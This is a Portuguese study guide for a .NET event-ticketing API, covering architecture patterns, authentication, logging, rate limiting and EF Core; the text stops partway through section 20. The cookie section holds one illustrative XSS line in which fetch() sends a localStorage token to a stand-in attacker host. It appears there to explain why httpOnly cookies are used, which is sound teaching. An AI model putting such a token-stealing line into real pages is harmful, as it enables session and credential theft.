# Documentação de Aprendizado — EventFlow

Registro dos conceitos estudados durante o desenvolvimento do projeto.
Cada seção explica **o que é**, **por que foi usado**, **alternativas** e **armadilhas**.

---

## Índice

1. [Clean Architecture](#1-clean-architecture)
2. [CQRS + MediatR](#2-cqrs--mediatr)
3. [Result\<T\> Pattern](#3-resultt-pattern)
4. [Pipeline Behaviors](#4-pipeline-behaviors)
5. [FluentValidation](#5-fluentvalidation)
6. [JWT + Refresh Token](#6-jwt--refresh-token)
7. [Cookies httpOnly](#7-cookies-httponly)
8. [Serilog — Logs Estruturados](#8-serilog--logs-estruturados)
9. [Middleware](#9-middleware)
10. [ProblemDetails — RFC 7807](#10-problemdetails--rfc-7807)
11. [Rate Limiting](#11-rate-limiting)
12. [Domain Events](#12-domain-events)
13. [EF Core Interceptors](#13-ef-core-interceptors)
14. [Docker](#14-docker)
15. [CI/CD — Contexto Futuro](#15-cicd--contexto-futuro)
16. [Autorização — Role vs Resource-based](#16-autorização--role-vs-resource-based)
17. [Unit of Work](#17-unit-of-work)
18. [Paginação](#18-paginação)
19. [Testes com Mocks — Moq](#19-testes-com-mocks--moq)
20. [AsNoTracking vs Tracked — EF Core](#20-asnotracking-vs-tracked--ef-core)
21. [Concorrência Otimista — xmin e DbUpdateConcurrencyException](#21-concorrência-otimista--xmin-e-dbupdateconcurrencyexception)
22. [Polly — Resiliência e Retry](#22-polly--resiliência-e-retry)
23. [Domain Events na Prática](#23-domain-events-na-prática)
24. [INotificationHandler — Comunicação Desacoplada](#24-inotificationhandler--comunicação-desacoplada)

---

## 1. Clean Architecture

### O que é?

Uma forma de organizar o código em **camadas concêntricas**, onde as camadas internas não conhecem as externas. A regra principal é: **a dependência sempre aponta para dentro**.

```
┌─────────────────────────────┐
│           API               │  ← recebe requests HTTP
│  ┌───────────────────────┐  │
│  │     Application       │  │  ← orquestra os casos de uso
│  │  ┌─────────────────┐  │  │
│  │  │     Domain      │  │  │  ← regras de negócio puras
│  │  └─────────────────┘  │  │
│  └───────────────────────┘  │
│  Infrastructure             │  ← banco, e-mail, arquivos
└─────────────────────────────┘
```

A `Infrastructure` implementa interfaces definidas no `Domain` — nunca o contrário.

### Por que usar?

Sem arquitetura definida, projetos crescem assim:

```csharp
// Controller fazendo tudo — comum em projetos sem arquitetura
[HttpPost]
public IActionResult CriarPedido([FromBody] PedidoDto dto)
{
    var conexao = new SqlConnection("...");  // acessa banco diretamente
    if (dto.Valor <= 0) return BadRequest(); // valida aqui
    var pedido = new Pedido { ... };
    conexao.Execute("INSERT...");            // SQL direto
    EmailService.Enviar(dto.Email);          // envia email aqui
    return Ok();
}
```

Problemas: impossível testar sem banco, impossível trocar o banco, impossível reusar a lógica.

Com Clean Architecture, cada responsabilidade tem um lugar certo. Trocar o PostgreSQL por SQL Server? Só muda a `Infrastructure`. Trocar a API por uma fila de mensagens? O `Application` e o `Domain` não mudam nada.

### A regra mais importante

> O `Domain` não pode depender de nada externo. Zero pacotes NuGet de infraestrutura.

Se você olhar o `EventFlow.Domain.csproj`, ele não tem nenhum `PackageReference`. Isso é proposital.

### Alternativas

- **MVC tradicional** (Controllers + Services + Repositories): mais simples, suficiente para CRUDs pequenos. Perde na testabilidade e clareza de responsabilidades.
- **Vertical Slice Architecture**: ao invés de camadas horizontais, organiza por feature. Cada feature tem tudo que precisa. Mais moderno, menos boilerplate. Vale estudar depois.

### Armadilhas comuns

- **Anemic Domain**: entidades só com getters/setters, toda lógica nos Services. Tecnicamente é Clean Architecture, mas perde o ponto — a lógica de negócio deveria estar nas entidades.
- **Vazar infraestrutura**: colocar `DbContext` ou `HttpClient` dentro do `Application`. Viola a regra de dependência.

---

## 2. CQRS + MediatR

### O que é CQRS?

**Command Query Responsibility Segregation** — separar operações que **escrevem** (Commands) das que **leem** (Queries).

```
Command = muda estado, não retorna dados (ou retorna só confirmação)
  Exemplos: RegisterCommand, CancelTicketCommand, PublishEventCommand

Query = lê dados, não muda nada
  Exemplos: GetEventsQuery, GetTicketByIdQuery
```

**Analogia:** numa loja, o caixa (Command) processa compras e muda o estoque. O consultor (Query) te mostra o catálogo sem mexer em nada.

### O que é MediatR?

É a biblioteca que implementa o padrão **Mediator**: ao invés do Controller conhecer o Handler diretamente, ele manda uma mensagem para o MediatR, que encontra o handler certo.

```
SEM MediatR:                    COM MediatR:
Controller → RegisterHandler    Controller → MediatR → RegisterHandler
Controller → LoginHandler       Controller → MediatR → LoginHandler
Controller → BookTicketHandler  Controller → MediatR → BookTicketHandler
```

O Controller não precisa conhecer nenhum handler — só o MediatR.

### Como funciona no código

```csharp
// 1. Define o Command (mensagem)
public record RegisterCommand(string Name, string Email, string Password, string Role)
    : IRequest<Result<AuthResponse>>;

// 2. Define o Handler (quem processa)
public class RegisterCommandHandler : IRequestHandler<RegisterCommand, Result<AuthResponse>>
{
    public async Task<Result<AuthResponse>> Handle(RegisterCommand command, CancellationToken ct)
    {
        // lógica aqui
    }
}

// 3. Controller só envia a mensagem
var result = await sender.Send(new RegisterCommand(...));
```

O MediatR liga o `RegisterCommand` ao `RegisterCommandHandler` automaticamente via reflection.

### Por que não usar Services direto?

Você poderia ter `IAuthService` com métodos `Register()`, `Login()`, etc. Funciona, mas:

- Um Service tende a crescer e acumular responsabilidades (God Object)
- Com MediatR, cada use case é uma classe separada — fácil de encontrar, fácil de testar
- Os Pipeline Behaviors (ver seção 4) ficam automáticos para tudo

### Armadilhas comuns

- **Commands que retornam muitos dados**: se um Command retorna uma lista completa, provavelmente deveria ser uma Query separada.
- **Handlers que chamam outros handlers via MediatR**: pode funcionar, mas cria acoplamento escondido. Prefira injetar o repositório diretamente.

---

## 3. Result\<T\> Pattern

### O problema com exceptions para fluxo de controle

```csharp
// ❌ Usando exceptions para controle de fluxo
public async Task<AuthResponse> LoginAsync(string email, string password)
{
    var user = await FindUser(email);
    if (user == null) throw new NotFoundException("Usuário não encontrado");
    if (!CheckPassword(user, password)) throw new UnauthorizedException("Senha inválida");
    return GenerateToken(user);
}

// Controller fica assim:
try { var result = await loginService.LoginAsync(email, password); return Ok(result); }
catch (NotFoundException) { return NotFound(); }
catch (UnauthorizedException) { return Unauthorized(); }
catch (Exception) { return StatusCode(500); }
```

Problemas:
- Se esquecer um `catch`, o erro vira 500
- Exceptions são caras (stack unwinding)
- O tipo de retorno (`AuthResponse`) não comunica que pode falhar

### A solução: Result\<T\>

```csharp
// ✅ Com Result<T>
public async Task<Result<AuthResponse>> LoginAsync(string email, string password)
{
    var user = await FindUser(email);
    if (user == null) return Result<AuthResponse>.NotFound("Usuário não encontrado");
    if (!CheckPassword(user, password)) return Result<AuthResponse>.Forbidden("Credenciais inválidas");
    return Result<AuthResponse>.Success(GenerateToken(user));
}

// Controller fica assim:
var result = await loginService.LoginAsync(email, password);
if (!result.IsSuccess) return MapErrorToResult(result); // centralizado
return Ok(result.Value);
```

O tipo de retorno `Result<AuthResponse>` já documenta que a operação pode falhar. O compilador te força a verificar.

### Quando usar exception então?

- **Bugs reais**: `NullReferenceException`, acesso a índice inválido — situações que nunca deveriam acontecer
- **Erros de infraestrutura**: banco fora do ar, disco cheio — o `ExceptionMiddleware` trata esses
- **Invariantes do domínio**: `DomainException` para quando o código que chama a entidade está errado (ex: tentar cancelar ingresso já usado)

### Alternativas

- **FluentResults** (biblioteca): Result\<T\> mais rico, com múltiplos erros, reasons, etc.
- **ErrorOr** (biblioteca): sintaxe mais fluente. Vale estudar.
- **Exceptions puras**: mais simples de entender no início, problemático em escala.

---

## 4. Pipeline Behaviors

### O que é?

Um **middleware para o MediatR** — código que executa automaticamente antes e/ou depois de **todo** handler, sem precisar colocar nada dentro de cada handler.

```
Request chega
    ↓
ValidationBehavior    ← valida os dados de entrada
    ↓
LoggingBehavior       ← loga início e tempo de execução
    ↓
Handler               ← lógica de negócio
    ↓
LoggingBehavior       ← loga conclusão
    ↓
Response sai
```

### Por que não colocar validação e log dentro de cada handler?

```csharp
// ❌ Sem Pipeline Behavior — repetido em CADA handler
public async Task<Result<AuthResponse>> Handle(LoginCommand cmd, CancellationToken ct)
{
    _logger.LogInformation("Iniciando LoginCommand"); // repetido
    var valid = _validator.Validate(cmd);              // repetido
    if (!valid.IsValid) throw new ValidationException(valid.Errors); // repetido

    // lógica de negócio...

    _logger.LogInformation("LoginCommand concluída"); // repetido
}
```

Com Pipeline Behaviors, o handler fica assim:

```csharp
// ✅ Com Pipeline Behavior — handler só tem o que importa
public async Task<Result<AuthResponse>> Handle(LoginCommand cmd, CancellationToken ct)
{
    var (success, userId, roles) = await _identityService.LoginAsync(cmd.Email, cmd.Password);
    // ...
}
```

Validação e log acontecem automaticamente para todo handler registrado.

### Analogia

É como o middleware HTTP do ASP.NET Core, mas para o pipeline interno do MediatR. A mesma ideia de "corredor de processamento" que a request passa antes de chegar ao destino.

---

## 5. FluentValidation

### O que é?

Biblioteca para definir regras de validação de input em classes separadas, de forma fluente e legível.

### Por que não usar DataAnnotations?

```csharp
// ❌ DataAnnotations — validação misturada com o modelo
public record RegisterCommand(
    [Required] [MaxLength(100)] string Name,
    [Required] [EmailAddress] string Email,
    [Required] [MinLength(8)] string Password
);
```

Problemas:
- Validação acoplada ao modelo — difícil de testar isoladamente
- Lógica condicional (ex: "obrigatório só se outro campo for X") fica feia
- Sem suporte a async (ex: verificar email no banco)

```csharp
// ✅ FluentValidation — separado, testável, expressivo
public class RegisterCommandValidator : AbstractValidator<RegisterCommand>
{
    public RegisterCommandValidator()
    {
        RuleFor(x => x.Email)
            .NotEmpty().WithMessage("E-mail obrigatório.")
            .EmailAddress().WithMessage("E-mail inválido.");

        RuleFor(x => x.Role)
            .Must(r => r == "Attendee" || r == "Organizer")
            .WithMessage("Role inválida.");
    }
}
```

### Validação vs Regra de Negócio

| | Onde fica | Exemplo |
|---|---|---|
| **Validação de input** | FluentValidation | "E-mail é obrigatório", "Senha tem 8+ chars" |
| **Regra de negócio** | Domain / Handler | "E-mail já cadastrado", "Evento está lotado" |

A distinção importa: FluentValidation valida o **formato** dos dados. O domínio valida se a **operação faz sentido**.

---

## 6. JWT + Refresh Token

### O que é JWT?

**JSON Web Token** — um token autocontido com 3 partes separadas por ponto:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
       Header                  Payload                        Signature
```

- **Header**: algoritmo usado (`HS256`)
- **Payload**: dados do usuário (`userId`, `email`, `roles`, `exp`)
- **Signature**: garante que ninguém alterou o payload

Qualquer servidor com a secret consegue **validar sem consultar o banco** — isso é "stateless".

### Por que access token de 15 minutos?

Se o token vazar (XSS, log, man-in-the-middle), o atacante só tem **15 minutos** para usá-lo. Tokens de longa duração (24h, 7 dias) são um risco enorme.

### O que é Refresh Token e por que existe?

15 minutos é muito pouco para o usuário ficar logado. O Refresh Token resolve isso:

```
1. Login → recebe Access Token (15min) + Refresh Token (7 dias)
2. Access Token expira
3. Client usa o Refresh Token → recebe novo Access Token
4. Usuário nunca percebe que foi "deslogado"
5. Logout → Refresh Token é invalidado no banco → não dá mais para renovar
```

O Refresh Token é **stateful** (salvo no banco, pode ser revogado). O Access Token é **stateless** (validado pela assinatura, sem banco).

### Rotação de Refresh Token

A cada uso, o Refresh Token antigo é **invalidado** e um novo é gerado. Se um atacante roubar o token e usá-lo, quando o usuário legítimo tentar renovar, o token já não existe — sinal de comprometimento.

### Por que HS256 e não RS256?

| | HS256 (usado aqui) | RS256 |
|---|---|---|
| Tipo | Chave simétrica | Chave assimétrica |
| Quem valida | Quem tem a secret | Qualquer um com a chave pública |
| Quando usar | Uma única API | Múltiplos serviços (microservices) |

Para uma API monolítica como o EventFlow, HS256 é suficiente e mais simples.

### Armadilhas comuns

- **Secret fraca**: usar "secret123" como secret é equivalente a não ter. Mínimo 256 bits (32 chars), gerado aleatoriamente.
- **Secret no appsettings.json**: esse arquivo vai para o Git. Use `user-secrets` em dev e variável de ambiente em produção.
- **ClockSkew zero**: por padrão o ASP.NET Core tolera 5 minutos de diferença de relógio. Colocamos zero — mais seguro, mas requer relógios sincronizados.

---

## 7. Cookies httpOnly

### O problema do localStorage

O jeito mais simples de guardar o token no frontend é o `localStorage`:

```javascript
localStorage.setItem('token', accessToken); // ❌ vulnerável
```

Problema: **qualquer JavaScript da página consegue ler** o localStorage. Se o site tiver uma vulnerabilidade XSS (injeção de script malicioso), o atacante roda:

```javascript
fetch('https://atacante.com/steal?token=' + localStorage.getItem('token'));
```

E pronto — token roubado.

### A solução: cookie httpOnly

```
Set-Cookie: refresh_token=xyz; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly**: JavaScript não consegue ler. `document.cookie` não retorna esse cookie.
- **Secure**: só enviado via HTTPS.
- **SameSite=Strict**: não enviado em requests cross-site (proteção contra CSRF).

O browser envia o cookie automaticamente em cada request para o mesmo domínio — o JavaScript nem sabe que ele existe.

### Por que só o Refresh Token fica no cookie?

O Access Token precisa ser enviado no header `Authorization: Bearer {token}` — o JavaScript precisa lê-lo para montar as requests. Então ele fica em memória (variável JavaScript), nunca no localStorage.

```
Access Token:  memória JavaScript (curta duração — 15min — dano limitado se vazar)
Refresh Token: cookie httpOnly   (longa duração — 7 dias — protegido contra XSS)
```

---

## 8. Serilog — Logs Estruturados

### Log comum vs Log estruturado

```csharp
// ❌ Log comum — string concatenada
_logger.LogInformation("Usuário " + userId + " reservou ingresso para evento " + eventId);

// Resultado no arquivo de log:
// [14:32:15] Usuário abc-123 reservou ingresso para evento xyz-456
```

Para pesquisar: `grep "reservou ingresso"` — funciona, mas e se quiser filtrar por userId específico?

```csharp
// ✅ Log estruturado — propriedades indexadas
_logger.LogInformation("Usuário {UserId} reservou ingresso para evento {EventId}", userId, eventId);

// Resultado (JSON):
// {"Timestamp":"14:32:15","Message":"Usuário abc-123 reservou ingresso...","UserId":"abc-123","EventId":"xyz-456"}
```

Agora você pode consultar: `WHERE UserId = 'abc-123'` — em ferramentas como Seq, Grafana, Kibana.

### Níveis de log

| Nível | Quando usar | Exemplo |
|---|---|---|
| `Verbose` | Detalhe extremo (só em debug local) | Cada linha de query SQL |
| `Debug` | Informação de diagnóstico | Valores de parâmetros |
| `Information` | Fluxo normal da aplicação | "Request iniciada", "Usuário logou" |
| `Warning` | Algo inesperado mas recuperável | Request lenta, tentativa de login falhou |
| `Error` | Erro que afeta uma operação | Exception capturada, falha ao salvar |
| `Fatal` | Erro que derruba a aplicação | Banco inacessível no startup |

### Correlation ID nos logs

Sem correlation ID, logs de requests paralelas ficam misturados:
```
[INFO] Iniciando LoginCommand
[INFO] Iniciando BookTicketCommand
[INFO] LoginCommand concluída em 45ms   ← qual request é essa?
```

Com correlation ID:
```
[INFO] [a1b2c3] Iniciando LoginCommand
[INFO] [x9y8z7] Iniciando BookTicketCommand
[INFO] [a1b2c3] LoginCommand concluída em 45ms  ← fácil rastrear
```

O `CorrelationIdMiddleware` injeta o ID no `LogContext` do Serilog uma vez, e todos os logs daquela request automaticamente incluem o campo.

---

## 9. Middleware

### O que é?

Um middleware é um componente no **pipeline de processamento de requests** do ASP.NET Core. Cada request passa por uma cadeia de middlewares antes de chegar ao controller.

```
Request HTTP
    ↓
ExceptionMiddleware      ← captura qualquer exceção do pipeline
    ↓
CorrelationIdMiddleware  ← garante ID único por request
    ↓
SerilogRequestLogging    ← loga cada request automaticamente
    ↓
Authentication           ← valida o JWT
    ↓
Authorization            ← verifica se o usuário tem permissão
    ↓
Controller               ← lógica da API
    ↓
Response HTTP
```

### Por que a ordem importa?

Se o `ExceptionMiddleware` não for o primeiro, exceções lançadas por outros middlewares (ex: `Authentication`) não serão capturadas por ele.

Se `Authentication` vem depois de `Authorization`, nenhum usuário será reconhecido — tudo retorna 403.

### Middleware vs Filter

Ambos são formas de executar código transversalmente:

| | Middleware | Filter (Action Filter) |
|---|---|---|
| Escopo | Todo o pipeline HTTP | Só controllers MVC |
| Acesso | HttpContext bruto | ActionContext, ModelState |
| Quando usar | Cross-cutting concerns globais | Lógica específica de API (ex: validar header customizado) |

---

## 10. ProblemDetails — RFC 7807

### O problema sem padrão

Cada API inventa seu próprio formato de erro:
```json
{ "error": "Not found" }
{ "message": "Not found", "code": 404 }
{ "msg": "Não encontrado", "success": false }
```

Clientes (frontend, apps mobile, outras APIs) precisam tratar cada formato diferente.

### A solução: RFC 7807

Padrão HTTP para respostas de erro em APIs JSON:

```json
{
  "type": "https://tools.ietf.org/html/rfc7231#section-6.5.4",
  "title": "Não encontrado",
  "status": 404,
  "detail": "Evento com Id 'abc-123' não foi encontrado.",
  "traceId": "a1b2c3d4"
}
```

O `traceId` é o Correlation ID — permite que o usuário reporte um erro e você encontre exatamente o que aconteceu nos logs.

O `ExceptionMiddleware` do projeto converte todas as exceções neste formato automaticamente.

---

## 11. Rate Limiting

### O que é?

Limite de requests por tempo. Protege endpoints sensíveis contra:
- **Brute force**: atacante testa milhares de senhas
- **DDoS**: sobrecarga intencional de requests
- **Scraping**: coleta excessiva de dados

### Fixed Window (usado no login)

```
Janela de 1 minuto: [----5 requests----][----5 requests----]
                     00:00        01:00   01:00        02:00
```

Permite 5 requests por janela fixa de 1 minuto. Na 6ª: `429 Too Many Requests`.

### Alternativas

| Algoritmo | Como funciona | Quando usar |
|---|---|---|
| **Fixed Window** | N req por janela fixa | Simples, suficiente para login |
| **Sliding Window** | Janela se move com o tempo | Mais suave, sem "burst" na virada |
| **Token Bucket** | Tokens recarregam gradualmente | APIs com tráfego irregular |

Para login, Fixed Window é suficiente — o objetivo é apenas dificultar brute force.

### Armadilha

Fixed Window tem um problema: no fim de uma janela + início da próxima, um atacante pode fazer 10 requests em sequência rápida (5 no último segundo + 5 no primeiro segundo seguinte). Sliding Window resolve isso, mas é mais complexo.

---

## 12. Domain Events

### O problema sem Domain Events

```csharp
// ❌ Handler acoplado a múltiplas responsabilidades
public async Task Handle(CancelTicketCommand cmd)
{
    var ticket = await _ticketRepo.GetById(cmd.TicketId);
    ticket.Cancel();
    await _context.SaveChanges();

    // Handler precisa conhecer TODAS as consequências do cancelamento:
    await _waitlistService.PromoteNext(ticket.EventId);    // ← acoplamento
    await _emailService.SendCancellation(ticket.AttendeeId); // ← acoplamento
    await _analyticsService.TrackCancellation(ticket);     // ← acoplamento
}
```

Adicionar uma nova consequência (ex: notificação push) exige mexer neste handler.

### A solução: Domain Events

```csharp
// ✅ Handler só cancela o ingresso
public async Task Handle(CancelTicketCommand cmd)
{
    var ticket = await _ticketRepo.GetById(cmd.TicketId);
    ticket.Cancel(); // internamente emite TicketCancelled
    await _context.SaveChanges();
    // despacha os domain events acumulados
    await _dispatcher.Dispatch(ticket.DomainEvents);
}

// Outros handlers reagem de forma independente:
public class WaitlistPromotionHandler : INotificationHandler<TicketCancelled> { ... }
public class CancellationEmailHandler : INotificationHandler<TicketCancelled> { ... }
```

Adicionar notificação push = criar `PushNotificationHandler` sem tocar no `CancelTicketHandler`.

### Nomenclatura: sempre no passado

```
✅ TicketCancelled      (algo que JÁ aconteceu)
✅ EventPublished
✅ WaitlistEntryPromoted

❌ CancelTicket         (isso é um Command, não um Event)
❌ OnTicketCancellation (verbo, não fato)
```

### Quando usar

- Quando uma ação dispara múltiplas consequências independentes
- Quando você quer desacoplar o "o quê aconteceu" do "o que fazer sobre isso"

### Quando não usar

- Para operações simples sem consequências secundárias — overhead desnecessário
- Quando a sequência é rígida e sempre deve acontecer junta — use transação direta

---

## 13. EF Core Interceptors

### O que é?

Um hook que o EF Core executa em momentos específicos do seu ciclo de vida. O `SaveChangesInterceptor` roda antes/depois de todo `SaveChanges()`.

### Por que usar ao invés de override no DbContext?

```csharp
// ❌ Override no DbContext — DbContext acumula responsabilidades
public override async Task<int> SaveChangesAsync(CancellationToken ct)
{
    AtualizaTimestamps();  // lógica de auditoria misturada
    AplicaSoftDelete();    // outra lógica misturada
    return await base.SaveChangesAsync(ct);
}

// ✅ Interceptors separados — cada um tem uma responsabilidade
services.AddDbContext<AppDbContext>((sp, options) => {
    options.AddInterceptors(
        sp.GetRequiredService<AuditInterceptor>(),
        sp.GetRequiredService<SoftDeleteInterceptor>()
    );
});
```

Interceptors são reutilizáveis, testáveis isoladamente e não poluem o DbContext.

### O que o AuditInterceptor faz

Antes de qualquer `SaveChanges()`, percorre todas as entidades modificadas e seta `UpdatedAt = DateTime.UtcNow`. **Impossível esquecer** — acontece automaticamente para toda entidade que herda de `BaseEntity`.

---

## 14. Docker

### O que é?

Docker empacota um programa + todas as suas dependências em uma **imagem**. Quando você executa essa imagem, ela vira um **container** — um processo isolado que funciona igual em qualquer máquina.

**Analogia:** Imagem = receita de bolo. Container = o bolo pronto. Você pode fazer vários bolos (containers) da mesma receita (imagem).

### Os 3 conceitos que importam

| Conceito | O que é | Analogia |
|---|---|---|
| **Image** | Template imutável com o programa empacotado | Receita / ISO de instalação |
| **Container** | Instância rodando de uma imagem | Programa instalado e aberto |
| **Volume** | Pasta que persiste dados fora do container | HD externo plugado no container |

**Por que volume importa?** Container é descartável — se você parar e recriar, tudo dentro some. O volume é o que salva os dados do PostgreSQL entre restarts.

### Docker Compose

Ao invés de rodar cada container na mão com comandos longos, o `docker-compose.yml` descreve tudo em um arquivo:

```bash
docker-compose up -d      # sobe todos os serviços em background
docker-compose down       # para e remove os containers (dados mantidos)
docker-compose down -v    # para E apaga volumes (dados somem)
docker-compose ps         # status dos serviços
docker-compose logs -f    # acompanha logs em tempo real
```

### O que acontece com os dados ao parar?

| Comando | Containers | Dados |
|---|---|---|
| `docker-compose stop` | Parados | Mantidos |
| `docker-compose down` | Removidos | Mantidos |
| `docker-compose down -v` | Removidos | **APAGADOS** |

### Armadilha: porta já em uso

Se o PostgreSQL estiver instalado nativamente na máquina, ele ocupa a porta 5432. O container Docker não consegue subir nessa porta. Solução: mudar o mapeamento de porta no docker-compose:

```yaml
ports:
  - "5433:5432"  # 5433 no host, 5432 dentro do container
```

---

## 15. CI/CD — Contexto Futuro

### O que é?

**CI (Continuous Integration):** toda vez que você faz push no Git, um servidor automaticamente:
1. Baixa o código
2. Compila
3. Roda todos os testes
4. Reporta se passou ou falhou

**CD (Continuous Delivery/Deployment):** se o CI passou, automaticamente:
1. Cria a imagem Docker da aplicação
2. Faz upload para um registry
3. Faz o deploy no servidor de produção

### Relação com Docker

Docker é uma **peça** do pipeline de CI/CD:

```
git push
    ↓
CI Server (GitHub Actions, Azure DevOps)
    ↓
dotnet build && dotnet test   ← CI
    ↓
docker build -t minha-api .   ← cria imagem
    ↓
docker push registry/minha-api ← envia para registry
    ↓
servidor baixa e roda          ← CD
```

### Quando estudar

Depois de ter o projeto funcionando localmente com Docker. Os conceitos necessários antes:
- ✅ Docker (feito)
- ✅ Testes automatizados (Fase 4 do projeto)
- GitHub Actions ou Azure DevOps (quando for fazer deploy)

---

## 16. Autorização — Role vs Resource-based

### O que é?

Existem dois níveis de autorização que se complementam:

**Role-based:** "Que tipo de usuário pode fazer isso?"
**Resource-based:** "Este usuário específico tem permissão sobre ESTE recurso?"

### Role-based Authorization

```csharp
// Só Organizers podem criar eventos
[Authorize(Roles = "Organizer")]
public async Task<IActionResult> Create(...) { }
```

Verificado **antes** de chegar no handler. O ASP.NET Core lê os claims de role do JWT e decide. Rápido — sem consulta ao banco.

### Resource-based Authorization

```csharp
// Só O DONO do evento pode editá-lo
[Authorize(Roles = "Organizer,Admin")]  // ← só garante o tipo de usuário
public async Task<IActionResult> Update(Guid id, ...) { }

// No HANDLER, verificamos quem é o dono:
if (@event.OrganizerId != currentUser.Id && !currentUser.IsInRole("Admin"))
    return Result.Forbidden("Você não tem permissão para editar este evento.");
```

Verificado **dentro do handler**, após carregar o recurso do banco. Necessário porque o atributo não tem acesso ao conteúdo do recurso.

### Por que não usar só roles?

Imagine dois Organizers: A e B. Ambos têm a role "Organizer".
- Role-based: Organizer A pode editar evento de Organizer B ✗
- Resource-based: Organizer A só edita os seus próprios eventos ✓

### Abordagem alternativa: IAuthorizationHandler

O ASP.NET Core tem um sistema de Policies que suporta resource-based:

```csharp
[Authorize(Policy = "EventOwner")]
public async Task<IActionResult> Update(Guid id) { }
```

Exige criar um `EventOwnerAuthorizationHandler` que injeta repositórios.
Mais formal, mas mais complexo. Para este projeto, verificação no handler é mais explícita e didática.

### Information Disclosure — retornar 404 ao invés de 403

```csharp
// Quando um Attendee tenta ver um evento em Draft:
return Result<EventDto>.NotFound($"Evento não encontrado.");
// ↑ Propositalmente NotFound, não Forbidden

// Por quê? Forbidden revelaria que o recurso EXISTE mas o usuário não tem acesso.
// NotFound não revela nada — o recurso pode ou não existir para quem pergunta.
// Mesma lógica do "credenciais inválidas" no login (user enumeration).
```

---

## 17. Unit of Work

### O que é?

Padrão que agrupa múltiplas operações de banco em **uma única transação**. Tudo acontece, ou nada acontece.

### Por que não chamar SaveChanges dentro dos repositórios?

```csharp
// ❌ SaveChanges dentro do repositório — cada operação é uma transação separada
public async Task AddAsync(Event @event)
{
    await _context.Events.AddAsync(@event);
    await _context.SaveChangesAsync(); // commit imediato
}

// Problema: se o segundo SaveChanges falhar, o primeiro já foi commitado
await eventRepo.AddAsync(evento);   // commit 1 ✓
await ticketRepo.AddAsync(ingresso); // commit 2 ✗ — falhou, mas evento já está no banco
// Estado inconsistente: evento existe, ingresso não
```

```csharp
// ✅ Com Unit of Work — tudo ou nada
await eventRepo.AddAsync(evento);    // apenas registra a intenção
await ticketRepo.AddAsync(ingresso); // apenas registra a intenção
await unitOfWork.SaveChangesAsync(); // um único commit com tudo
// Se falhar aqui: NENHUMA das duas operações persiste
```

### O EF Core já implementa isso

O `DbContext` do EF Core já é um Unit of Work — cada instância rastreia as mudanças e commita tudo de uma vez no `SaveChanges`. O `IUnitOfWork` do projeto é apenas uma interface fina para:
1. Manter o Application desacoplado do EF Core
2. Facilitar mock nos testes de Application

---

## 18. Paginação

### Por que paginar?

Sem paginação, uma query pode retornar milhares de registros:
- Alto consumo de memória no servidor
- Resposta lenta para o cliente
- O frontend não consegue exibir tudo de uma vez

### Como funciona

```
Total: 47 registros, PageSize: 10

Página 1: Skip(0).Take(10)  → registros 1-10
Página 2: Skip(10).Take(10) → registros 11-20
Página 3: Skip(20).Take(10) → registros 21-30
...
Página 5: Skip(40).Take(7)  → registros 41-47
```

### O que retornar

```json
{
  "items": [...],
  "totalCount": 47,
  "pageNumber": 2,
  "pageSize": 10,
  "hasNextPage": true,
  "hasPreviousPage": true,
  "totalPages": 5
}
```

`totalCount` permite ao frontend calcular o número de páginas e renderizar os controles de navegação.

### Armadilha: paginação em memória vs no banco

```csharp
// ❌ Busca TUDO do banco, depois pagina em memória
var all = await context.Events.ToListAsync();
var page = all.Skip(skip).Take(size); // tarde demais — já carregou tudo

// ✅ Paginação no banco — só carrega o que precisa
var page = await context.Events
    .Skip(skip).Take(size)
    .ToListAsync(); // SQL com LIMIT e OFFSET
```

No EventFlow, a paginação está em memória na Fase 2 porque já filtramos no banco por status. Em volume alto, mover o Skip/Take para dentro do repositório (query no banco) é a melhoria natural.

---

## 19. Testes com Mocks — Moq

### O que é um Mock?

Um objeto falso que implementa uma interface com comportamento controlado pelo teste. Permite testar um componente isolado das suas dependências.

```csharp
// Interface real:
public interface IEventRepository
{
    Task<Event?> GetByIdAsync(Guid id, CancellationToken ct);
}

// Mock: objeto falso que implementa a interface
var mockRepo = new Mock<IEventRepository>();

// Setup: define o que o método retorna quando chamado
mockRepo
    .Setup(r => r.GetByIdAsync(It.IsAny<Guid>(), It.IsAny<CancellationToken>()))
    .ReturnsAsync(null); // simula "não encontrado"

// Verify: verifica se o método foi chamado (e quantas vezes)
mockRepo.Verify(r => r.GetByIdAsync(It.IsAny<Guid>(), default), Times.Once);
```

### O que testar em cada camada

| Camada | O que testar | Dependências |
|---|---|---|
| **Domain.Tests** | Lógica das entidades, máquina de estados | Nenhuma — zero dependências |
| **Application.Tests** | Lógica dos handlers, orquestração | Mocks de repositórios e serviços |
| **API.Tests** | Fluxo completo HTTP→banco→resposta | Banco real via TestContainers (Fase 4) |

### Por que Moq e não mocks manuais?

```csharp
// Mock manual — trabalhoso e frágil
public class FakeEventRepository : IEventRepository
{
    public Task<Event?> GetByIdAsync(Guid id, CancellationToken ct)
        => Task.FromResult<Event?>(null);
    // precisaria implementar TODOS os métodos da interface
}

// Moq — configurável por teste, sem implementar tudo
var mock = new Mock<IEventRepository>();
mock.Setup(r => r.GetByIdAsync(specificId, default)).ReturnsAsync(someEvent);
```

---

## 20. AsNoTracking vs Tracked — EF Core

### O que é tracking?

Quando o EF Core carrega uma entidade, ele a "rastreia" — guarda uma cópia do estado original. No `SaveChanges`, ele compara o estado atual com o original e gera o SQL de UPDATE automaticamente.

```csharp
// Tracked (padrão): EF detecta mudanças e gera UPDATE automaticamente
var evento = await context.Events.FirstOrDefaultAsync(e => e.Id == id);
evento.Title = "Novo Título"; // EF detecta a mudança
await context.SaveChangesAsync(); // gera: UPDATE events SET title = 'Novo Título' WHERE id = ...

// AsNoTracking: EF não detecta mudanças — mais rápido, mas não persiste
var evento = await context.Events.AsNoTracking().FirstOrDefaultAsync(e => e.Id == id);
evento.Title = "Novo Título"; // alteração ignorada pelo EF
await context.SaveChangesAsync(); // não gera nenhum UPDATE
```

### Quando usar cada um

| Situação | Abordagem |
|---|---|
| Leitura para exibição (GET) | `AsNoTracking()` — ~30% mais rápido |
| Modificação (Update, Publish, Cancel) | Tracked (padrão) |
| Relatórios e listagens | `AsNoTracking()` |
| Operações que precisam de Lock otimista | Tracked (Fase 3) |

### No EventFlow

```csharp
// Para leitura (GetById em GET /events/{id}):
GetByIdAsync() → AsNoTracking()

// Para modificação (PUT /events/{id}, POST /events/{id}/publish):
